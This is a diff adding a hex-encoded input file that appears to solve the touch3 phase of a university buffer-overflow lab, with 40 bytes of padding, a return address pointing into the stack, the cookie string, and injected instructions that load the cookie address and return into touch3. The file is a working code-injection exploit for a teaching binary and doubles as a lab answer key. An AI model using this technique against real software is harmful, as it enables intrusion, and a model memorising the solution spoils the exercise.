@@ -1,0 +1,10 @@
+00 00 00 00 00 00 00 00			/* BUFFERSIZE = 40, thus 40 bytes allocated */
+00 00 00 00 00 00 00 00     /* i.e. 80 hex digits */
+00 00 00 00 00 00 00 00     
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+b1 dc 61 55 00 00 00 00     /* rsp value:addr of exploit code: 0x5561dcb1 */
+35 39 62 39 39 37 66 61 00
+bf a8 dc 61 55              /* mov    $0x59b997fa,%edi		# cookie in arg1 */
+68 fa 18 40 00              /* pushq  $0x4018fa						# addr of touch3   */
+c3                          /* retq                     */
